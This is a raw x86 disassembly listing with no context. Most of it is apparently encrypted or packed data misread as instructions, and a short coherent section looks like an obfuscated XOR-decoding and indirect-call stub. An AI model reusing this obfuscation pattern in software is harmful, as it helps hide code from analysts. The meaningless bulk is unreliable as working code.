  408b2b:	dec    esp
  408b2c:	adc    eax,DWORD PTR [edx+0x11]
  408b2f:	pop    ebx
  408b30:	sti    
  408b31:	ret    0xf2e9
  408b34:	cmp    bh,ah
  408b36:	jbe    0x408abb
  408b38:	aas    
  408b39:	out    0x5a,al
  408b3b:	jl     0x408aef
  408b3d:	inc    ecx
  408b3e:	cs fs dec eax
  408b41:	repz jno 0x408b6b
  408b44:	dec    esp
  408b45:	sbb    BYTE PTR [ebx-0xb],0x70
  408b49:	imul   edi,eax,0x4a
  408b4c:	out    dx,al
  408b4d:	xchg   esi,eax
  408b4e:	push   ds
  408b4f:	mov    cl,BYTE PTR [esi]
  408b51:	jl     0x408b4f
  408b53:	dec    esp
  408b54:	les    esp,FWORD PTR [ebp+0x5a13515a]
  408b5a:	xchg   DWORD PTR [edi-0x33cb829b],ecx
  408b60:	mov    esi,0x11a423dd
  408b65:	add    eax,edi
  408b67:	in     eax,0xc0
  408b69:	jecxz  0x408b62
  408b6b:	inc    ebp
  408b6c:	idiv   DWORD PTR [eax]
  408b6e:	or     BYTE PTR [eax],dl
  408b70:	mov    bl,BYTE PTR [edx+eax*2+0x48e2f0f5]
  408b77:	test   DWORD PTR [ecx+0x5b],ebp
  408b7a:	cmp    eax,0x2e2a6fee
  408b7f:	push   esp
  408b80:	std    
  408b81:	sub    ah,BYTE PTR [ebx+0xd5dfb]
  408b87:	test   eax,0x5fe792e8
  408b8c:	mov    esi,DWORD PTR [ecx+esi*1+0x51]
  408b90:	mov    cl,BYTE PTR [eax]
  408b92:	xchg   edi,eax
  408b93:	inc    eax
  408b94:	push   eax
  408b95:	mov    dl,0x57
  408b97:	cmp    DWORD PTR [esi],edx
  408b99:	add    DWORD PTR [eax],esp
  408b9b:	out    dx,eax
  408b9c:	add    ecx,DWORD PTR [esi+0x58901fd8]
  408ba2:	jg     0x408b3c
  408ba4:	fidiv  DWORD PTR [edx-0x51bc8ac6]
  408baa:	jne    0x408bd8
  408bac:	ror    DWORD PTR [edi-0x43],0x2a
  408bb0:	sub    esi,0x2f
  408bb3:	jp     0x408bbf
  408bb5:	mov    esi,0xf6f07262
  408bba:	pop    esp
  408bbb:	push   edi
  408bbc:	cld    
  408bbd:	loopne 0x408b42
  408bbf:	shr    BYTE PTR [ebx-0x6b5527d4],cl
  408bc5:	adc    bh,ah
  408bc7:	mov    edi,0x23fe82cd
  408bcc:	je     0x408bc9
  408bce:	adc    BYTE PTR [ebp+0x2a831745],bl
  408bd4:	mov    ecx,0x159bc5ae
  408bd9:	cwde   
  408bda:	cwde   
  408bdb:	popf   
  408bdc:	xor    eax,0xbf8d2962
  408be1:	std    
  408be2:	stos   DWORD PTR es:[edi],eax
  408be3:	popf   
  408be4:	pop    esp
  408be5:	mov    DWORD PTR [edx-0x593fe9c6],esi
  408beb:	outs   dx,DWORD PTR ds:[esi]
  408bec:	dec    esp
  408bed:	sub    eax,0x57339528
  408bf2:	dec    eax
  408bf3:	xchg   ebp,eax
  408bf4:	mov    fs,WORD PTR [ebp*8-0x20cc4570]
  408bfb:	mov    eax,0xf534091d
  408c00:	mov    DWORD PTR [eax-0x62],ecx
  408c03:	mov    edx,0x30e65758
  408c08:	or     al,0x53
  408c0a:	loope  0x408c3e
  408c0c:	pushf  
  408c0d:	sub    BYTE PTR [eax],dl
  408c0f:	inc    edi
  408c10:	ror    BYTE PTR [ecx+0x1170ead4],1
  408c16:	imul   ebx,DWORD PTR [eax],0x3b
  408c19:	out    0xb5,al
  408c1b:	mov    dl,0x48
  408c1d:	popa   
  408c1e:	ret    
  408c1f:	ja     0x408c17
  408c21:	aas    
  408c22:	lahf   
  408c23:	push   eax
  408c24:	cmp    al,dl
  408c26:	icebp  
  408c27:	jne    0x408bf4
  408c29:	jne    0x408c4e
  408c2b:	pop    esp
  408c2c:	pop    ds
  408c2d:	(bad)  
  408c2f:	pusha  
  408c30:	int    0x2c
  408c32:	dec    ecx
  408c33:	cmp    BYTE PTR [edx+0x37],bl
  408c36:	aad    0xf7
  408c38:	in     eax,dx
  408c39:	hlt    
  408c3a:	retf   0xd857
  408c3d:	jg     0x408c24
  408c3f:	xlat   BYTE PTR ds:[ebx]
  408c40:	sbb    BYTE PTR [ecx-0x2e0b8845],dh
  408c46:	xor    ch,BYTE PTR [eax+0x5b]
  408c49:	gs mov bl,0xbb
  408c4c:	cli    
  408c4d:	push   ss
  408c4e:	(bad)  
  408c4f:	inc    DWORD PTR [ecx+0x4a]
  408c52:	daa    
  408c53:	icebp  
  408c54:	mov    ebx,0xcf90741
  408c59:	or     eax,0xbf70e509
  408c5e:	jae    0x408be3
  408c60:	sti    
  408c61:	lods   eax,DWORD PTR ds:[esi]
  408c62:	cmp    ecx,DWORD PTR [edi+0x49]
  408c65:	mov    edx,0xb2dc3db4
  408c6a:	pushf  
  408c6b:	or     ecx,DWORD PTR [edx-0x3]
  408c6e:	dec    esp
  408c6f:	and    ebx,esi
  408c71:	test   DWORD PTR [esi-0x754022],esi
  408c77:	lahf   
  408c78:	sbb    DWORD PTR ds:0xac92bc34,0x63695be6
  408c82:	es mov al,0xc
  408c85:	mov    al,0xaf
  408c87:	inc    eax
  408c88:	push   ebp
  408c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c8a:	sti    
  408c8b:	mov    edx,0xc046f11c
  408c90:	dec    eax
  408c91:	cli    
  408c92:	fwait
  408c93:	test   BYTE PTR [esi+0x5e6b54a8],ah
  408c99:	pop    ds
  408c9a:	add    al,0x99
  408c9c:	mov    dh,bh
  408c9e:	pop    edx
  408c9f:	fimul  DWORD PTR [esi+0x3f]
  408ca2:	sbb    BYTE PTR [ecx+ebp*4],dl
  408ca5:	adc    bl,cl
  408ca7:	cld    
  408ca8:	xor    BYTE PTR [esi],ch
  408caa:	or     edi,DWORD PTR [eax-0x5e1bcc18]
  408cb0:	rcr    ebp,cl
  408cb2:	jmp    0x855e:0x3a2443c1
  408cb9:	sar    eax,0xa5
  408cbc:	lds    ebp,FWORD PTR [esi]
  408cbe:	ror    DWORD PTR [edx-0x51],1
  408cc1:	test   BYTE PTR [ecx-0x4c],0xaf
  408cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cc6:	hlt    
  408cc7:	mov    esi,0x5f98f3b7
  408ccc:	out    dx,al
  408ccd:	dec    edi
  408cce:	xor    al,0xa6
  408cd0:	jne    0x408c92
  408cd2:	hlt    
  408cd3:	add    eax,0x3491e0cb
  408cd8:	nop
  408cd9:	rcl    esp,cl
  408cdb:	jnp    0x408d2f
  408cdd:	mov    ebp,0x9b2b0058
  408ce2:	pop    esp
  408ce3:	int3   
  408ce4:	je     0x408d1f
  408ce6:	and    eax,0x72056dca
  408ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cec:	std    
  408ced:	jne    0x408c73
  408cef:	mov    esi,0x16b62a38
  408cf4:	mov    WORD PTR [ebp-0x609f44da],es
  408cfa:	and    dh,al
  408cfc:	xor    al,0x3c
  408cfe:	icebp  
  408cff:	inc    ebp
  408d00:	aaa    
  408d01:	mov    ds:0x850f9528,al
  408d06:	inc    ecx
  408d07:	fdiv   st(7),st
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xa83327cf
  408e55:	cmp    al,0x5d
  408e57:	sbb    eax,0x6262198a
  408e5c:	sub    ebx,DWORD PTR [edi+0x62]
  408e5f:	bound  ebp,QWORD PTR [ecx]
  408e61:	retf   0x3767
  408e64:	sti    
  408e65:	mov    DWORD PTR [ebx-0x6d75b5c8],eax
  408e6b:	cmp    bl,ah
  408e6d:	mov    al,ds:0x707b0db8
  408e72:	mov    eax,?
  408e74:	lea    ebx,[edx-0x45]
  408e77:	push   ss
  408e78:	in     eax,0x7c
  408e7a:	int    0xf3
  408e7c:	sbb    BYTE PTR [edx-0xcaa061b],cl
  408e82:	and    BYTE PTR [esi+ebx*4],0x27
  408e86:	adc    bh,BYTE PTR [eax+0x298b115d]
  408e8c:	loop   0x408e75
  408e8e:	cld    
  408e8f:	hlt    
  408e90:	mov    esi,0x4f314a5d
  408e95:	sub    eax,0xb722c31c
  408e9a:	mov    ds:0xd472aef2,eax
  408e9f:	out    dx,eax
  408ea0:	outs   dx,DWORD PTR ds:[esi]
  408ea1:	jmp    0x408eef
  408ea3:	mov    gs,WORD PTR [esi+0x3a]
  408ea6:	pusha  
  408ea7:	sti    
  408ea8:	lods   eax,DWORD PTR ds:[esi]
  408ea9:	in     eax,dx
  408eaa:	fild   WORD PTR [ebx-0x10]
  408ead:	push   ss
  408eae:	cmp    bl,BYTE PTR [ebx]
  408eb0:	xor    dh,BYTE PTR [eax+ebp*1+0x6e]
  408eb4:	inc    edi
  408eb5:	mov    ebp,0x4bc8053f
  408eba:	mov    al,0xf2
  408ebc:	jmp    0x8fa6bd9e
  408ec1:	int    0x36
  408ec3:	and    cl,BYTE PTR [edi-0x57ab8c67]
  408ec9:	xchg   ebx,eax
  408eca:	xchg   esp,eax
  408ecb:	or     BYTE PTR [eax+0x13],cl
  408ece:	xchg   BYTE PTR [ebx],cl
  408ed0:	mov    dl,cl
  408ed2:	sbb    al,0xea
  408ed4:	push   0xffffff92
  408ed6:	sar    BYTE PTR [edi-0x4e8f6981],0xe7
  408edd:	popf   
  408ede:	xor    ah,BYTE PTR [eax-0x75]
  408ee1:	inc    edi
  408ee3:	add    BYTE PTR [esp+ebx*4-0x6896fde1],dl
  408eea:	or     al,0x3d
  408eec:	lds    ebp,FWORD PTR [esi+0x27]
  408eef:	jne    0x408eee
  408ef1:	nop
  408ef2:	sbb    bl,BYTE PTR [esi-0x47]
  408ef5:	cli    
  408ef6:	ins    DWORD PTR es:[edi],dx
  408ef7:	iret   
  408ef8:	mov    ebx,0x6a304700
  408efd:	pusha  
  408efe:	aad    0x7e
  408f00:	push   ecx
  408f01:	push   cs
  408f02:	sub    ch,al
  408f04:	pop    es
  408f05:	dec    edi
  408f06:	lahf   
  408f07:	jle    0x408e8b
  408f09:	lods   al,BYTE PTR ds:[esi]
  408f0a:	xchg   edi,eax
  408f0b:	in     eax,0x69
  408f0d:	ja     0x408efd
  408f0f:	add    eax,eax
  408f11:	test   eax,0x8b208b9d
  408f16:	mov    ecx,0x728dec0f
  408f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1c:	xlat   BYTE PTR ds:[ebx]
  408f1d:	dec    eax
  408f1e:	mov    dh,0xbd
  408f20:	or     DWORD PTR [esi+0x1680861],ecx
  408f26:	fstp   DWORD PTR [edx-0x50]
  408f29:	pop    ecx
  408f2a:	push   cs
  408f2b:	mov    ch,0xbb
  408f2d:	retf   
  408f2e:	(bad)  
  408f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f30:	xor    dh,BYTE PTR [ebx]
  408f32:	xchg   esi,eax
  408f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f34:	push   eax
  408f35:	aad    0x9a
  408f37:	iret   
  408f38:	es pusha 
  408f3a:	push   cs
  408f3b:	xchg   ebx,eax
  408f3c:	scas   eax,DWORD PTR es:[edi]
  408f3d:	xchg   edi,eax
  408f3e:	push   esp
  408f3f:	xrstors [ecx-0x6e24aa77]
  408f46:	dec    edx
  408f47:	xor    ebp,DWORD PTR ds:0x296a84e0
  408f4d:	cmp    BYTE PTR [edx+ebx*2-0x2cb351f4],bl
  408f54:	mov    edi,0xfe8729e9
  408f59:	(bad)  
  408f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f5b:	add    BYTE PTR [edx],cl
  408f5d:	jecxz  0x408f51
  408f5f:	das    
  408f60:	xor    esp,DWORD PTR [eax+edx*4-0x61]
  408f64:	out    dx,al
  408f65:	mov    ch,0x33
  408f67:	add    eax,DWORD PTR [ebx-0x5]
  408f6a:	jle    0x408f01
  408f6c:	pusha  
  408f6d:	cli    
  408f6e:	pop    edx
  408f6f:	cmp    bl,BYTE PTR [eax+0x1f]
  408f72:	sub    eax,0x68d630e5
  408f77:	xchg   esi,eax
  408f78:	cli    
  408f79:	add    BYTE PTR [edi+edi*8+0x5f],bh
  408f7d:	mov    ?,WORD PTR [esp+eiz*2+0x79]
  408f81:	dec    esp
  408f82:	rol    DWORD PTR [ebp-0x47],cl
  408f85:	xor    esi,DWORD PTR [ebp-0x7f]
  408f88:	mov    bh,0xc
  408f8a:	gs (bad) 
  408f8d:	seto   BYTE PTR [eax+0x13c3363e]
  408f94:	ds ins BYTE PTR es:[edi],dx
  408f96:	pop    ss
  408f97:	scas   al,BYTE PTR es:[edi]
  408f98:	pop    edx
  408f99:	leave  
  408f9a:	jae    0x408f4d
  408f9c:	jo     0x408f41
  408f9e:	sub    BYTE PTR [esi],al
  408fa0:	adc    ch,BYTE PTR [ebx-0x77]
  408fa3:	jo     0x408f2f
  408fa5:	or     ecx,ebx
  408fa7:	dec    esi
  408fa8:	sub    BYTE PTR [esi],ch
  408faa:	das    
  408fab:	hlt    
  408fac:	into   
  408fad:	xchg   ebx,eax
  408fae:	pop    ebx
  408faf:	out    0x32,al
  408fb1:	push   cs
  408fb2:	mov    ds:0x3ca1764c,eax
  408fb7:	adc    al,0x4f
  408fb9:	out    0xcd,al
  408fbb:	into   
  408fbc:	mov    al,0x14
  408fbe:	and    eax,0x95063d75
  408fc3:	rcl    BYTE PTR [ebx],cl
  408fc5:	push   ebp
  408fc6:	mov    ebx,0xf83fbe6d
  408fcb:	js     0x409029
  408fcd:	fcomp  st(1)
  408fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fd0:	pop    edi
  408fd1:	mov    eax,ds:0x6db7e83b
  408fd6:	fld    QWORD PTR [ecx-0x424cbe00]
  408fdc:	xchg   BYTE PTR [ebx+0x4adce947],al
  408fe2:	pop    ebp
  408fe3:	cmp    al,0x38
  408fe5:	and    eax,0xa448d658
  408fea:	lds    edi,FWORD PTR [ebp-0x4e0ac28]
  408ff0:	and    ebx,DWORD PTR [eax+0x3f]
  408ff3:	pop    edx
  408ff5:	inc    ecx
  408ff6:	jmp    0xdf34:0x83e9a567
  408ffd:	out    dx,al
  408ffe:	or     bh,bl
  409000:	mov    bl,0x6a
  409002:	fnstcw WORD PTR [esi-0x186ecb1c]
  409008:	dec    eax
  409009:	cmc    
  40900a:	mov    ebp,0x41efb0b9
  40900f:	jmp    0xd8db:0x529f9e53
  409016:	cmp    eax,0x6ffda69b
  40901b:	es jp  0x408fec
  40901e:	mov    ch,0x6a
  409020:	leave  
  409021:	gs jle 0x409094
  409024:	(bad)  
  409025:	fcmovne st,st(3)
  409027:	pop    ss
  409028:	xchg   ecx,eax
  409029:	pop    esi
  40902a:	jnp    0x40900c
  40902c:	fsub   st(5),st
  40902e:	mov    esi,DWORD PTR [edi-0x399e48c4]
  409034:	neg    BYTE PTR [ebx+0x2f8ac606]
  40903a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40903b:	push   0x60c36e1
  409040:	jns    0x409053
  409042:	sub    eax,0x32cb02bf
  409047:	pop    esi
  409048:	mov    eax,0x7c7861cd
  40904d:	add    BYTE PTR [ecx+edi*2+0x69],al
  409051:	in     eax,0xdd
  409053:	pop    edx
  409054:	xchg   ecx,eax
  409055:	mov    eax,ds:0x246a70e8
  40905a:	(bad)  
  40905b:	inc    ebp
  40905c:	cmp    bh,BYTE PTR [esi+ecx*2]
  40905f:	scas   eax,DWORD PTR es:[edi]
  409060:	out    0xc1,eax
  409062:	dec    edi
  409063:	push   ds
  409064:	cmp    esi,eax
  409066:	pop    si
  409068:	stc    
  409069:	dec    eax
  40906a:	or     BYTE PTR [edi+0x372c81de],dl
  409070:	and    al,0x20
  409072:	and    edi,eax
  409074:	scas   eax,DWORD PTR es:[edi]
  409075:	ror    dl,1
  409077:	sub    BYTE PTR [ebx],dh
  409079:	push   edx
  40907a:	push   esp
  40907b:	pop    esp
  40907c:	dec    esi
  40907d:	xor    edx,ebp
  40907f:	lods   al,BYTE PTR ds:[esi]
  409080:	retf   0x5161
  409083:	clc    
  409084:	imul   BYTE PTR [ebx]
  409086:	clc    
  409087:	push   edi
  409088:	xor    edx,DWORD PTR [ebp+0xfb4e111]
  40908e:	mov    cl,0xb3
  409090:	sbb    eax,0x7a83ed9a
  409095:	xor    DWORD PTR ds:0x67e589a8,esi
  40909b:	xor    DWORD PTR [esi],ebp
  40909d:	inc    esp
  40909e:	xchg   edx,eax
  40909f:	jmp    0x9e9b:0x3ac2adf9
  4090a6:	aas    
  4090a7:	jne    0x4090e0
  4090a9:	nop
  4090aa:	mov    al,0x8a
  4090ac:	xchg   DWORD PTR [eax+0x55],ebp
  4090af:	xor    DWORD PTR [edi+0x39],ecx
  4090b2:	sbb    al,0x6a
  4090b4:	les    ecx,FWORD PTR [edi]
  4090b6:	push   0xfffffff4
  4090b8:	xchg   ebp,eax
  4090b9:	adc    DWORD PTR [esi],ebp
  4090bb:	and    DWORD PTR [esi-0x1f],0xfffffff7
  4090bf:	cmp    BYTE PTR [ebx+0x27],0xdf
  4090c3:	(bad)  
  4090c4:	mov    WORD PTR [ebp-0x70ead3d3],?
  4090ca:	rcl    DWORD PTR [esi*4-0xa099146],cl
  4090d1:	mov    ch,0xdf
  4090d3:	xor    DWORD PTR [edi+0x55],eax
  4090d6:	jns    0x4090be
  4090d8:	push   es
  4090d9:	cld    
  4090da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090db:	jno    0x409116
  4090dd:	fistp  QWORD PTR [ecx+edi*2-0x5c]
  4090e1:	(bad)  
  4090e2:	jnp    0x409118
  4090e4:	in     al,dx
  4090e5:	(bad)  
  4090e6:	mov    ah,0xaa
  4090e8:	xor    eax,DWORD PTR [esi-0x6f]
  4090eb:	test   ecx,edi
  4090ed:	cmp    eax,0x9ca3a0d5
  4090f2:	call   0x25268a53
  4090f7:	dec    esi
  4090f8:	js     0x40915a
  4090fa:	sub    al,0xf5
  4090fc:	rol    BYTE PTR [edi-0x1],cl
  4090ff:	dec    ebp
  409100:	test   cl,dl
  409102:	repz add bl,dl
  409105:	mov    al,ds:0xe71c9bd3
  40910a:	jnp    0x409094
  40910c:	adc    al,0x59
  40910e:	dec    ebx
  40910f:	push   eax
  409110:	rol    BYTE PTR [esi],0xeb
  409113:	imul   ebx,DWORD PTR [eax-0x414539dd],0x86ae289
  40911d:	xchg   ebp,eax
  40911e:	fdivrp st(6),st
  409120:	jb     0x4090f5
  409122:	cmp    ebp,DWORD PTR [eax+0x47]
  409125:	and    BYTE PTR [esi-0x492c5c8],ch
  40912b:	pop    ecx
  40912c:	mov    ecx,DWORD PTR [edi+0x1d4d74e8]
  409132:	dec    ecx
  409133:	shl    DWORD PTR [edx+0x51],cl
  409136:	fisub  DWORD PTR [edx-0x2bf6e348]
  40913c:	(bad)  
  40913d:	aad    0xcf
  40913f:	sbb    eax,0x2e2d25fa
  409144:	sub    BYTE PTR [edi+0x742dc708],ch
  40914a:	pop    edx
  40914b:	cmp    bh,ah
  40914d:	xchg   ebx,eax
  40914e:	stc    
  40914f:	xchg   edx,eax
  409150:	arpl   WORD PTR [edi+0x7b],dx
  409153:	ins    BYTE PTR es:[edi],dx
  409154:	push   es
  409155:	and    ecx,edi
  409157:	fmul   st(4),st
  409159:	scas   al,BYTE PTR es:[edi]
  40915a:	xchg   DWORD PTR [edx+0x3f1026f1],ecx
  409160:	sar    ebx,0xf2
  409163:	jge    0x409161
  409165:	js     0x409103
  409167:	pop    esi
  409168:	pop    edi
  409169:	inc    edi
  40916a:	bound  ebp,QWORD PTR [ecx+eiz*4+0x67f62568]
  409171:	dec    edx
  409172:	cmp    DWORD PTR ds:0x9657f740,0xecc87c4c
  40917c:	mov    dl,0xb8
  40917e:	(bad)  
  40917f:	jb     0x4091f6
  409181:	es test ah,bl
  409184:	cwde   
  409185:	mov    eax,ds:0x9eddd5db
  40918a:	inc    ebx
  40918b:	mov    ah,0xe1
  40918d:	mov    edi,0x934f71ee
  409192:	mov    ebx,0x92c4df9f
  409197:	ret    0xa48f
  40919a:	les    esp,FWORD PTR [ebp+0x5542f59c]
  4091a0:	sub    al,0x5f
  4091a3:	fistp  QWORD PTR [esi+0x4d]
  4091a6:	sub    bl,bh
  4091a8:	push   esp
  4091a9:	adc    esi,0xffffff8d
  4091ac:	mov    dh,0x6f
  4091ae:	add    cl,BYTE PTR [edi+0x51]
  4091b1:	jb     0x4091a2
  4091b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091b4:	ret    0xf893
  4091b7:	icebp  
  4091b8:	and    eax,0x483ff8f3
  4091bd:	lods   eax,DWORD PTR ds:[esi]
  4091be:	sbb    DWORD PTR [edi-0x26],esi
  4091c1:	fucomi st,st(0)
  4091c3:	and    al,BYTE PTR [edi-0x72255d3f]
  4091c9:	neg    DWORD PTR [ecx-0x2b68bf9a]
  4091cf:	sbb    dh,ah
  4091d1:	loope  0x4091bb
  4091d3:	call   0xc6ece32a
  4091d8:	pop    ecx
  4091d9:	inc    ecx
  4091da:	icebp  
  4091db:	push   cs
  4091dc:	pusha  
  4091dd:	xchg   esp,eax
  4091de:	xchg   esi,eax
  4091df:	in     eax,0x5
  4091e1:	dec    ebp
  4091e2:	and    edx,DWORD PTR [ebp+0x3b]
  4091e5:	add    eax,0xbc4d225c
  4091ea:	repnz arpl WORD PTR [ebx+0x755a6d02],bp
  4091f1:	xchg   eax,ebx
  4091f3:	add    eax,0x58bb7e43
  4091f8:	fnstcw WORD PTR [eax]
  4091fa:	imul   edx,DWORD PTR [ebx-0x1575e1a4],0x83483919
  409204:	int3   
  409205:	push   edi
  409207:	test   DWORD PTR [eax+0x406942bb],esi
  40920d:	inc    edx
  40920e:	push   eax
  40920f:	dec    DWORD PTR [ecx]
  409211:	fnsave [ebx]
  409213:	test   eax,0xca382c88
  409218:	mov    edx,0x5897ae3f
  40921e:	cmp    ebx,ecx
  409220:	push   0x5f4d1af1
  409225:	xor    bl,bl
  409227:	pop    esp
  409228:	dec    edx
  409229:	push   ebx
  40922a:	push   cs
  40922b:	add    DWORD PTR [ebx-0x29],edx
  40922e:	pop    ebp
  40922f:	push   ebx
  409230:	loopne 0x40926c
  409232:	xchg   ebp,eax
  409233:	scas   eax,DWORD PTR es:[edi]
  409234:	mov    DWORD PTR [esi],ecx
  409236:	push   ebp
  409237:	inc    DWORD PTR ds:0xa9a84b01
  40923d:	xor    eax,0x3a827a33
  409242:	test   BYTE PTR [edi+0x1d1802ee],cl
  409248:	add    ch,BYTE PTR [esi+ecx*1+0x65]
  40924c:	jle    0x409257
  40924e:	push   eax
  40924f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409250:	pop    eax
  409251:	jne    0x409223
  409253:	mov    ah,0xfc
  409255:	dec    ebp
  409256:	call   0xe177:0x919eb42
  40925d:	mov    ebx,0x9fa95bde
  409262:	(bad)  
  409263:	push   esp
  409264:	sbb    DWORD PTR [edx+edx*4+0x756b1056],0xffffffc2
  40926c:	jp     0x4092e0
  40926e:	xor    eax,0xfdc1d3fe
  409273:	mov    eax,ds:0xd8daa84a
  409278:	adc    BYTE PTR [ebx-0x6d7f3394],dh
  40927e:	lds    ecx,FWORD PTR [edi]
  409280:	push   es
  409281:	out    dx,eax
  409282:	mov    al,0x62
  409284:	in     eax,dx
  409285:	pusha  
  409286:	hlt    
  409287:	cmp    edx,DWORD PTR [eax]
  409289:	sahf   
  40928a:	pop    es
  40928b:	das    
  40928c:	adc    al,dl
  40928e:	sub    esp,DWORD PTR [ebx+0x20]
  409291:	(bad)  
  409292:	stos   BYTE PTR es:[edi],al
  409293:	and    al,0x68
  409295:	rcr    DWORD PTR [ebx-0x29],cl
  409298:	pop    ebx
  409299:	jecxz  0x409278
  40929b:	popa   
  40929c:	sbb    bh,BYTE PTR [eax+0x13]
  40929f:	add    al,0xa5
  4092a1:	data16 cs stc 
  4092a4:	dec    esi
  4092a5:	add    DWORD PTR [edx+0x9a968e8],ecx
  4092ab:	dec    edx
  4092ac:	add    dh,BYTE PTR [edx-0x5daf5513]
  4092b2:	adc    eax,0xc6c4bb5a
  4092b7:	mov    ebp,0x2166188b
  4092bc:	jbe    0x40926b
  4092be:	mov    bl,0xaf
  4092c0:	sbb    eax,0x9ee66ce2
  4092c5:	mov    al,0x71
  4092c7:	dec    edx
  4092c8:	mov    ah,0x22
  4092ca:	mov    dl,0x46
  4092cc:	out    dx,eax
  4092cd:	stc    
  4092ce:	pop    eax
  4092cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d0:	call   0xbe57235e
  4092d5:	push   ebp
  4092d6:	mov    bl,0xd7
  4092d8:	cmp    esp,DWORD PTR [edi-0x5fb50c28]
  4092de:	mov    DWORD PTR [ebp+0x6ec6d370],edi
  4092e4:	sub    al,BYTE PTR [eax+0x757cc0e6]
  4092ea:	ds (bad) 
  4092ed:	adc    cl,BYTE PTR [edx-0x4dc5a7d5]
  4092f3:	mov    al,ds:0xb2267456
  4092f8:	(bad)  
  4092f9:	lock cmp BYTE PTR [edx],ch
  4092fc:	jl     0x409335
  4092fe:	pop    eax
  4092ff:	int    0x63
  409301:	nop
  409302:	mov    edx,0xcafdb642
  409307:	mov    cl,bh
  409309:	call   0xfe7488d
  40930e:	(bad)  
  40930f:	and    edx,esi
  409311:	clc    
  409312:	stos   BYTE PTR es:[edi],al
  409313:	out    dx,al
  409314:	jmp    FWORD PTR [ecx+0x7]
  409317:	shr    BYTE PTR [esi],0x4f
  40931a:	mov    ah,0x5b
  40931c:	dec    ebp
  40931d:	jge    0x409398
  40931f:	xchg   edx,eax
